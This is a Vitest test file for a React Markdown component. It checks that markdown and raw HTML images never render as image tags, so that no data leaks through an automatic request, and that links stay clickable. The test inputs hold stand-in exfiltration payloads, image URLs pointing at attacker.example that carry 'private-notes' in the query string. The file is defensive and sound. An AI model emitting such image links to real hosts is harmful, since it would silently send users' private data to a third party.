import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { Markdown } from "./markdown";

describe("Markdown", () => {
  it("never loads an image, since the browser would send its URL with no click", () => {
    const html = renderToStaticMarkup(
      <Markdown text="Look: ![a chart](https://attacker.example/?data=private-notes)" />,
    );
    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
    expect(html).toContain("[image: a chart]");
  });

  it("doesn't load a raw HTML image either", () => {
    const html = renderToStaticMarkup(<Markdown text={'<img src="https://attacker.example/x">'} />);
    expect(html).not.toContain("<img");
  });

  it("keeps links, opening them separately, since they need a click", () => {
    const html = renderToStaticMarkup(<Markdown text="[a source](https://a.example/)" />);
    expect(html).toContain('href="https://a.example/"');
    expect(html).toContain('target="_blank"');
  });
});
